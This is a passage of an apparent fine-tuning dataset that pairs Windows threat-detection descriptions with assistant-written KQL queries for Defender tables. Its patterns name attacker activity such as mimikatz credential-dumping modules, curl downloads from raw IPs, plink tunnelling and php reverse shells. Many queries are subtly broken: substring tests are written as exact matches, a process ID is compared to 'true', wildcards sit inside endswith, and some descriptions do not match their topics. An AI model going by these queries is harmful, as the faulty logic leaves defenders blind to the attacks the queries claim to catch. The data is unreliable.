\"--healthcheck\" and ProcessCommandLine contains \"--server \")) and (not((InitiatingProcessFolderPath in~ (\"\\\\PingCastleReporting.exe\", \"\\\\PingCastleCloud.exe\", \"\\\\PingCastle.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems Topic: proc_creation_win_susp_network_command"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"ipconfig /all\", \"netsh interface show interface\", \"arp -a\", \"nbtstat -n\", \"net config\", \"route print\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious file downloads directly from IP addresses using curl.exe Topic: proc_creation_win_curl_download_direct_ip_susp_extensions"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \".bat\" or ProcessCommandLine endswith \".bat\\\"\" or ProcessCommandLine endswith \".dat\" or ProcessCommandLine endswith \".dat\\\"\" or ProcessCommandLine endswith \".dll\" or ProcessCommandLine endswith \".dll\\\"\" or ProcessCommandLine endswith \".exe\" or ProcessCommandLine endswith \".exe\\\"\" or ProcessCommandLine endswith \".gif\" or ProcessCommandLine endswith \".gif\\\"\" or ProcessCommandLine endswith \".hta\" or ProcessCommandLine endswith \".hta\\\"\" or ProcessCommandLine endswith \".jpeg\" or ProcessCommandLine endswith \".jpeg\\\"\" or ProcessCommandLine endswith \".log\" or ProcessCommandLine endswith \".log\\\"\" or ProcessCommandLine endswith \".msi\" or ProcessCommandLine endswith \".msi\\\"\" or ProcessCommandLine endswith \".png\" or ProcessCommandLine endswith \".png\\\"\" or ProcessCommandLine endswith \".ps1\" or ProcessCommandLine endswith \".ps1\\\"\" or ProcessCommandLine endswith \".psm1\" or ProcessCommandLine endswith \".psm1\\\"\" or ProcessCommandLine endswith \".vbe\" or ProcessCommandLine endswith \".vbe\\\"\" or ProcessCommandLine endswith \".vbs\" or ProcessCommandLine endswith \".vbs\\\"\" or ProcessCommandLine endswith \".bat'\" or ProcessCommandLine endswith \".dat'\" or ProcessCommandLine endswith \".dll'\" or ProcessCommandLine endswith \".exe'\" or ProcessCommandLine endswith \".gif'\" or ProcessCommandLine endswith \".hta'\" or ProcessCommandLine endswith \".jpeg'\" or ProcessCommandLine endswith \".log'\" or ProcessCommandLine endswith \".msi'\" or ProcessCommandLine endswith \".png'\" or ProcessCommandLine endswith \".ps1'\" or ProcessCommandLine endswith \".psm1'\" or ProcessCommandLine endswith \".vbe'\" or ProcessCommandLine endswith \".vbs'\") and (ProcessCommandLine in~ (\" -O\", \"--remote-name\", \"--output\")) and ProcessCommandLine =~ \"http\" and (FolderPath endswith \"\\\\curl.exe\" or ProcessVersionInfoOriginalFileName =~ \"curl.exe\") and ProcessCommandLine matches regex \"://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user. Topic: proc_creation_win_hktl_evil_winrm"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-i \", \"-u \", \"-p \")) and InitiatingProcessFolderPath =~ \"\\\\ruby.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Execution of plink to perform data exfiltration and tunneling Topic: proc_creation_win_plink_susp_tunneling"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \":127.0.0.1:3389\" and InitiatingProcessFolderPath =~ \"\\\\plink.exe\") or ((ProcessCommandLine =~ \":3389\" and InitiatingProcessFolderPath =~ \"\\\\plink.exe\") and (ProcessCommandLine in~ (\" -P 443\", \" -P 22\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects tampering with attachment manager settings policies attachments (See reference for more information) Topic: registry_set_policies_attachments_tamper"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Attachments*\" and ((RegistryKey endswith \"\\\\HideZoneInfoOnProperties\" and RegistryValueData =~ \"DWORD (0x00000001)\") or (RegistryKey endswith \"\\\\SaveZoneInformation\" and RegistryValueData =~ \"DWORD (0x00000002)\") or (RegistryKey endswith \"\\\\ScanWithAntiVirus\" and RegistryValueData =~ \"DWORD (0x00000001)\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of msiexec.exe from an uncommon directory Topic: proc_creation_win_msiexec_masquerading"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\msiexec.exe\" or ProcessVersionInfoOriginalFileName =~ \"\\\\msiexec.exe\") and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\", \"C:\\\\Windows\\\\WinSxS\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of Gpg4win to encrypt files Topic: proc_creation_win_gpg4win_encryption"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -c \", \"passphrase\")) and ((FolderPath endswith \"\\\\gpg.exe\" or FolderPath endswith \"\\\\gpg2.exe\") or ProcessVersionInfoFileDescription =~ \"GnuPG\u2019s OpenPGP tool\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL hijack of \"iertutil.dll\" found in the DCOM InternetExplorer.Application Class over the network Topic: file_event_win_dcom_iertutil_dll_hijack"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Internet Explorer\\\\iertutil.dll\" and InitiatingProcessFolderPath =~ \"System\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects updates to Sysmons configuration. Attackers might update or replace the Sysmon configuration with a bare bone one to avoid monitoring without shutting down the service completely Topic: proc_creation_win_sysinternals_sysmon_config_update"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\Sysmon64.exe\" or FolderPath endswith \"\\\\Sysmon.exe\") or ProcessVersionInfoFileDescription =~ \"System activity monitor\") and (ProcessCommandLine contains \"-c\" or ProcessCommandLine contains \"/c\" or ProcessCommandLine contains \"\u2013c\" or ProcessCommandLine contains \"\u2014c\" or ProcessCommandLine contains \"\u2015c\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry key established after masqueraded .scr file execution using Rundll32 through desk.cpl Topic: registry_set_scr_file_executed_by_rundll32"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\" and (RegistryValueData endswith \".scr\" and RegistryKey contains \"\\\\Control Panel\\\\Desktop\\\\SCRNSAVE.EXE\") and (not((RegistryValueData contains \"C:\\\\Windows\\\\System32\\\\\" or RegistryValueData contains \"C:\\\\Windows\\\\SysWOW64\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a shell program such as the Windows command prompt or PowerShell is launched with system privileges. Use this rule to hunt for potential suspicious processes.\n Topic: proc_creation_win_susp_elevated_system_shell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\cmd.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\", \"Cmd.Exe\"))) and ((InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and InitiatingProcessSessionId =~ \"0x3e7\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file named \"wermgr.exe\" being created in an uncommon directory. This could be a sign of potential exploitation of CVE-2023-36874. Topic: file_event_win_exploit_cve_2023_36874_wermgr_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\wermgr.exe\" and (not((FileName in~ (\":\\\\$WINDOWS.~BT\\\\NewOS\\\\\", \":\\\\$WinREAgent\\\\\", \":\\\\Windows\\\\servicing\\\\LCU\\\\\", \":\\\\Windows\\\\System32\\\\\", \":\\\\Windows\\\\SysWOW64\\\\\", \":\\\\Windows\\\\WinSxS\\\\\", \":\\\\WUDownloadCache\\\\\", \":\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an initiated network connection by a non browser process on the system to \"azurewebsites.net\". The latter was often used by threat actors as a malware hosting and exfiltration site.\n Topic: net_connection_win_domain_azurewebsites"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and RemoteUrl =~ \"azurewebsites.net\") and (not((InitiatingProcessFolderPath =~ \"\\\\avant.exe\" or InitiatingProcessFolderPath =~ \"\\\\brave.exe\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\", \"C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\")) or InitiatingProcessFolderPath =~ \"\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\" or ((InitiatingProcessFolderPath contains \"C:\\\\Program Files\\\\Windows Defender Advanced Threat Protection\\\\\" or InitiatingProcessFolderPath contains \"C:\\\\Program Files\\\\Windows Defender\\\\\" or InitiatingProcessFolderPath contains \"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\\") and (InitiatingProcessFolderPath in~ (\"\\\\MsMpEng.exe\", \"\\\\MsSense.exe\"))) or (InitiatingProcessFolderPath has_all (\"\\\\Discord.exe\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Discord\\\\\") or (InitiatingProcessFolderPath startswith \"C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeWebView\\\\Application\\\\\" or InitiatingProcessFolderPath endswith \"\\\\WindowsApps\\\\MicrosoftEdge.exe\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\", \"C:\\\\Program Files\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\"))) or (InitiatingProcessFolderPath in~ (\"\\\\msedge.exe\", \"\\\\msedgewebview2.exe\")) or InitiatingProcessFolderPath =~ \"\" or InitiatingProcessFolderPath =~ \"\\\\falkon.exe\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\", \"C:\\\\Program Files (x86)\\\\Mozilla Firefox\\\\firefox.exe\")) or InitiatingProcessFolderPath =~ \"\\\\AppData\\\\Local\\\\Mozilla Firefox\\\\firefox.exe\" or (InitiatingProcessFolderPath has_all (\"\\\\Flock.exe\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Flock\\\\\") or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\iexplore.exe\", \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\")) or (InitiatingProcessFolderPath has_all (\"\\\\maxthon.exe\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Maxthon\\\\\") or isnull(InitiatingProcessFolderPath) or (InitiatingProcessFolderPath has_all (\"\\\\opera.exe\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Programs\\\\Opera\\\\\") or (InitiatingProcessFolderPath has_all (\"\\\\Phoebe.exe\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Phoebe\\\\\") or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\PRTG Network Monitor\\\\PRTG Probe.exe\", \"C:\\\\Program Files\\\\PRTG Network Monitor\\\\PRTG Probe.exe\")) or InitiatingProcessFolderPath =~ \"\\\\QtWeb.exe\" or ((InitiatingProcessFolderPath contains \"C:\\\\Program Files (x86)\\\\Safari\\\\\" or InitiatingProcessFolderPath contains \"C:\\\\Program Files\\\\Safari\\\\\") and InitiatingProcessFolderPath =~ \"\\\\safari.exe\") or InitiatingProcessFolderPath =~ \"\\\\seamonkey.exe\" or InitiatingProcessFolderPath =~ \"\\\\slimbrowser.exe\" or (InitiatingProcessFolderPath has_all (\"\\\\vivaldi.exe\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Vivaldi\\\\\") or InitiatingProcessFolderPath =~ \"\\\\whale.exe\" or InitiatingProcessFolderPath =~ \"\\\\Waterfox.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the Qakbot uninstaller file mentioned in the USAO-CDCA document on the disruption of the Qakbot malware and botnet Topic: proc_creation_win_malware_qakbot_uninstaller_cleanup"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\QbotUninstall.exe\" or (SHA256 startswith \"423A9D13D410E2DC38EABB9FDF3121D2072472D0426260283A638B822DCD5180\" or SHA256 startswith \"559CAE635F0D870652B9482EF436B31D4BB1A5A0F51750836F328D749291D0B6\" or SHA256 startswith \"855EB5481F77DDE5AD8FA6E9D953D4AEBC280DDDF9461144B16ED62817CC5071\" or SHA256 startswith \"FAB408536AA37C4ABC8BE97AB9C1F86CB33B63923D423FDC2859EB9D63FA8EA0\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of Self Extraction Directive files (.sed) in a potentially suspicious location.\nThese files are used by the \"iexpress.exe\" utility in order to create self extracting packages.\nAttackers were seen abusing this utility and creating PE files with embedded \".sed\" entries.\n Topic: file_event_win_sed_file_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".sed\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of scheduled tasks that involves a temporary folder and runs only once Topic: proc_creation_win_schtasks_creation_temp_folder"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" /create \", \" /sc once \", \"\\\\Temp\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detection well-known mimikatz command line arguments Topic: proc_creation_win_hktl_mimikatz_command_line"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"::aadcookie\", \"::detours\", \"::memssp\", \"::mflt\", \"::ncroutemon\", \"::ngcsign\", \"::printnightmare\", \"::skeleton\", \"::preshutdown\", \"::mstsc\", \"::multirdp\")) or (ProcessCommandLine in~ (\"rpc::\", \"token::\", \"crypto::\", \"dpapi::\", \"sekurlsa::\", \"kerberos::\", \"lsadump::\", \"privilege::\", \"process::\", \"vault::\")) or (ProcessCommandLine in~ (\"DumpCreds\", \"mimikatz\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Windows Test Authoring and Execution Framework (TAEF) framework allows you to run automation by executing tests files written on different languages (C, C#, Microsoft COM Scripting interfaces\nAdversaries may execute malicious code (such as WSC file with VBScript, dll and so on) directly by running te.exe\n Topic: proc_creation_win_susp_use_of_te_bin"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\te.exe\" or InitiatingProcessFolderPath endswith \"\\\\te.exe\" or ProcessVersionInfoOriginalFileName =~ \"\\\\te.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the registry value \"PythonFunctionWarnings\" that would prevent any warnings or alerts from showing when Python functions are about to be executed.\nThreat actors could run malicious code through the new Microsoft Excel feature that allows Python to run within the spreadsheet.\n Topic: registry_set_office_disable_python_security_warnings"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Microsoft\\\\Office*\" and RegistryKey endswith \"\\\\Excel\\\\Security\\\\PythonFunctionWarnings\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation/modification of Assistive Technology applications and persistence with usage of at Topic: registry_event_susp_atbroker_change"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Accessibility\\\\ATs\" or RegistryKey contains \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Accessibility\\\\Configuration\") and (not(((RegistryValueData =~ \"(Empty)\" and InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\atbroker.exe\" and RegistryKey contains \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Accessibility\\\\Configuration\") or (InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\Installer\\\\MSI\" and RegistryKey contains \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Accessibility\\\\ATs\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker modifies the \"REG_MULTI_SZ\" value named \"Extensions\" to include a custom DLL to achieve persistence via lsass.\nThe \"Extensions\" list contains filenames of DLLs being automatically loaded by lsass.exe. Each DLL has its InitializeLsaExtension() method called after loading.\n Topic: registry_set_persistence_lsa_extension"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\LsaExtensionConfig\\\\LsaSrv\\\\Extensions\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of php using the \"-r\" flag. This is could be used as a way to launch a reverse shell or execute live php code. Topic: proc_creation_win_php_inline_command_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -r\" and (FolderPath endswith \"\\\\php.exe\" or ProcessVersionInfoOriginalFileName =~ \"php.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect use of the Windows 8.3 short name. Which could be used as a method to avoid Image based detection Topic: proc_creation_win_susp_ntfs_short_name_use_image"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath contains \"~1.bat\" or FolderPath contains \"~1.dll\" or FolderPath contains \"~1.exe\" or FolderPath contains \"~1.hta\" or FolderPath contains \"~1.js\" or FolderPath contains \"~1.msi\" or FolderPath contains \"~1.ps1\" or FolderPath contains \"~1.tmp\" or FolderPath contains \"~1.vbe\" or FolderPath contains \"~1.vbs\" or FolderPath contains \"~2.bat\" or FolderPath contains \"~2.dll\" or FolderPath contains \"~2.exe\" or FolderPath contains \"~2.hta\" or FolderPath contains \"~2.js\" or FolderPath contains \"~2.msi\" or FolderPath contains \"~2.ps1\" or FolderPath contains \"~2.tmp\" or FolderPath contains \"~2.vbe\" or FolderPath contains \"~2.vbs\") and (not(InitiatingProcessFileName =~ \"C:\\\\Windows\\\\explorer.exe\")) and (not((InitiatingProcessFileName =~ \"\\\\thor\\\\thor64.exe\" or InitiatingProcessFolderPath =~ \"\\\\VCREDI~1.EXE\" or InitiatingProcessFileName =~ \"\\\\WebEx\\\\WebexHost.exe\" or FolderPath =~ \"C:\\\\PROGRA~1\\\\WinZip\\\\WZPREL~1.EXE\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"ConvertTo-SecureString\" cmdlet via the commandline. Which is fairly uncommon and could indicate potential suspicious activity Topic: proc_creation_win_powershell_cmdline_convertto_securestring"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"ConvertTo-SecureString\" and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of SharpEvtHook, a tool that tampers with the Windows event logs Topic: proc_creation_win_hktl_sharpevtmute"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\SharpEvtMute.exe\" or ProcessVersionInfoFileDescription =~ \"SharpEvtMute\" or (ProcessCommandLine contains \"--Filter \\\"rule \" or ProcessCommandLine contains \"--Encoded --Filter \\\\\\\"\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity. Topic: proc_creation_win_susp_emoji_usage_in_cli_1"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\ud83d\ude00\", \"\ud83d\ude03\", \"\ud83d\ude04\", \"\ud83d\ude01\", \"\ud83d\ude06\", \"\ud83d\ude05\", \"\ud83d\ude02\", \"\ud83e\udd23\", \"\ud83e\udd72\", \"\ud83e\udd79\", \"\u263a\ufe0f\", \"\ud83d\ude0a\", \"\ud83d\ude07\", \"\ud83d\ude42\", \"\ud83d\ude43\", \"\ud83d\ude09\", \"\ud83d\ude0c\", \"\ud83d\ude0d\", \"\ud83e\udd70\", \"\ud83d\ude18\", \"\ud83d\ude17\", \"\ud83d\ude19\", \"\ud83d\ude1a\", \"\ud83d\ude0b\", \"\ud83d\ude1b\", \"\ud83d\ude1d\", \"\ud83d\ude1c\", \"\ud83e\udd2a\", \"\ud83e\udd28\", \"\ud83e\uddd0\", \"\ud83e\udd13\", \"\ud83d\ude0e\", \"\ud83e\udd78\", \"\ud83e\udd29\", \"\ud83e\udd73\", \"\ud83d\ude0f\", \"\ud83d\ude12\", \"\ud83d\ude1e\", \"\ud83d\ude14\", \"\ud83d\ude1f\", \"\ud83d\ude15\", \"\ud83d\ude41\", \"\u2639\ufe0f\", \"\ud83d\ude23\", \"\ud83d\ude16\", \"\ud83d\ude2b\", \"\ud83d\ude29\", \"\ud83e\udd7a\", \"\ud83d\ude22\", \"\ud83d\ude2d\", \"\ud83d\ude2e\u200d\ud83d\udca8\", \"\ud83d\ude24\", \"\ud83d\ude20\", \"\ud83d\ude21\", \"\ud83e\udd2c\", \"\ud83e\udd2f\", \"\ud83d\ude33\", \"\ud83e\udd75\", \"\ud83e\udd76\", \"\ud83d\ude31\", \"\ud83d\ude28\", \"\ud83d\ude30\", \"\ud83d\ude25\", \"\ud83d\ude13\", \"\ud83e\udee3\", \"\ud83e\udd17\", \"\ud83e\udee1\", \"\ud83e\udd14\", \"\ud83e\udee2\", \"\ud83e\udd2d\", \"\ud83e\udd2b\", \"\ud83e\udd25\", \"\ud83d\ude36\", \"\ud83d\ude36\u200d\ud83c\udf2b\ufe0f\", \"\ud83d\ude10\", \"\ud83d\ude11\", \"\ud83d\ude2c\", \"\ud83e\udee0\", \"\ud83d\ude44\", \"\ud83d\ude2f\", \"\ud83d\ude26\", \"\ud83d\ude27\", \"\ud83d\ude2e\", \"\ud83d\ude32\", \"\ud83e\udd71\", \"\ud83d\ude34\", \"\ud83e\udd24\", \"\ud83d\ude2a\", \"\ud83d\ude35\", \"\ud83d\ude35\u200d\ud83d\udcab\", \"\ud83e\udee5\", \"\ud83e\udd10\", \"\ud83e\udd74\", \"\ud83e\udd22\", \"\ud83e\udd2e\", \"\ud83e\udd27\", \"\ud83d\ude37\", \"\ud83e\udd12\", \"\ud83e\udd15\", \"\ud83e\udd11\", \"\ud83e\udd20\", \"\ud83d\ude08\", \"\ud83d\udc7f\", \"\ud83d\udc79\", \"\ud83d\udc7a\", \"\ud83e\udd21\", \"\ud83d\udca9\", \"\ud83d\udc7b\", \"\ud83d\udc80\", \"\u2620\ufe0f\", \"\ud83d\udc7d\", \"\ud83d\udc7e\", \"\ud83e\udd16\", \"\ud83c\udf83\", \"\ud83d\ude3a\", \"\ud83d\ude38\", \"\ud83d\ude39\", \"\ud83d\ude3b\", \"\ud83d\ude3c\", \"\ud83d\ude3d\", \"\ud83d\ude40\", \"\ud83d\ude3f\", \"\ud83d\ude3e\", \"\ud83d\udc4b\", \"\ud83e\udd1a\", \"\ud83d\udd90\", \"\u270b\", \"\ud83d\udd96\", \"\ud83d\udc4c\", \"\ud83e\udd0c\", \"\ud83e\udd0f\", \"\u270c\ufe0f\", \"\ud83e\udd1e\", \"\ud83e\udef0\", \"\ud83e\udd1f\", \"\ud83e\udd18\", \"\ud83e\udd19\", \"\ud83e\udef5\", \"\ud83e\udef1\", \"\ud83e\udef2\", \"\ud83e\udef3\", \"\ud83e\udef4\", \"\ud83d\udc48\", \"\ud83d\udc49\", \"\ud83d\udc46\", \"\ud83d\udd95\", \"\ud83d\udc47\", \"\u261d\ufe0f\", \"\ud83d\udc4d\", \"\ud83d\udc4e\", \"\u270a\", \"\ud83d\udc4a\", \"\ud83e\udd1b\", \"\ud83e\udd1c\", \"\ud83d\udc4f\", \"\ud83e\udef6\", \"\ud83d\ude4c\", \"\ud83d\udc50\", \"\ud83e\udd32\", \"\ud83e\udd1d\", \"\ud83d\ude4f\", \"\u270d\ufe0f\", \"\ud83d\udcaa\", \"\ud83e\uddbe\", \"\ud83e\uddb5\", \"\ud83e\uddbf\", \"\ud83e\uddb6\", \"\ud83d\udc63\", \"\ud83d\udc42\", \"\ud83e\uddbb\", \"\ud83d\udc43\", \"\ud83e\udec0\", \"\ud83e\udec1\", \"\ud83e\udde0\", \"\ud83e\uddb7\", \"\ud83e\uddb4\", \"\ud83d\udc40\", \"\ud83d\udc41\", \"\ud83d\udc45\", \"\ud83d\udc44\", \"\ud83e\udee6\", \"\ud83d\udc8b\", \"\ud83e\ude78\", \"\ud83d\udc76\", \"\ud83d\udc67\", \"\ud83e\uddd2\", \"\ud83d\udc66\", \"\ud83d\udc69\", \"\ud83e\uddd1\", \"\ud83d\udc68\", \"\ud83d\udc69\u200d\ud83e\uddb1\", \"\ud83e\uddd1\u200d\ud83e\uddb1\", \"\ud83d\udc68\u200d\ud83e\uddb1\", \"\ud83d\udc69\u200d\ud83e\uddb0\", \"\ud83e\uddd1\u200d\ud83e\uddb0\", \"\ud83d\udc68\u200d\ud83e\uddb0\", \"\ud83d\udc71\u200d\u2640\ufe0f\", \"\ud83d\udc71\", \"\ud83d\udc71\u200d\u2642\ufe0f\", \"\ud83d\udc69\u200d\ud83e\uddb3\", \"\ud83e\uddd1\u200d\ud83e\uddb3\", \"\ud83d\udc68\u200d\ud83e\uddb3\", \"\ud83d\udc69\u200d\ud83e\uddb2\", \"\ud83e\uddd1\u200d\ud83e\uddb2\", \"\ud83d\udc68\u200d\ud83e\uddb2\", \"\ud83e\uddd4\u200d\u2640\ufe0f\", \"\ud83e\uddd4\", \"\ud83e\uddd4\u200d\u2642\ufe0f\", \"\ud83d\udc75\", \"\ud83e\uddd3\", \"\ud83d\udc74\", \"\ud83d\udc72\", \"\ud83d\udc73\u200d\u2640\ufe0f\", \"\ud83d\udc73\", \"\ud83d\udc73\u200d\u2642\ufe0f\", \"\ud83e\uddd5\", \"\ud83d\udc6e\u200d\u2640\ufe0f\", \"\ud83d\udc6e\", \"\ud83d\udc6e\u200d\u2642\ufe0f\", \"\ud83d\udc77\u200d\u2640\ufe0f\", \"\ud83d\udc77\", \"\ud83d\udc77\u200d\u2642\ufe0f\", \"\ud83d\udc82\u200d\u2640\ufe0f\", \"\ud83d\udc82\", \"\ud83d\udc82\u200d\u2642\ufe0f\", \"\ud83d\udd75\ufe0f\u200d\u2640\ufe0f\", \"\ud83d\udd75\ufe0f\", \"\ud83d\udd75\ufe0f\u200d\u2642\ufe0f\", \"\ud83d\udc69\u200d\u2695\ufe0f\", \"\ud83e\uddd1\u200d\u2695\ufe0f\", \"\ud83d\udc68\u200d\u2695\ufe0f\", \"\ud83d\udc69\u200d\ud83c\udf3e\", \"\ud83e\uddd1\u200d\ud83c\udf3e\", 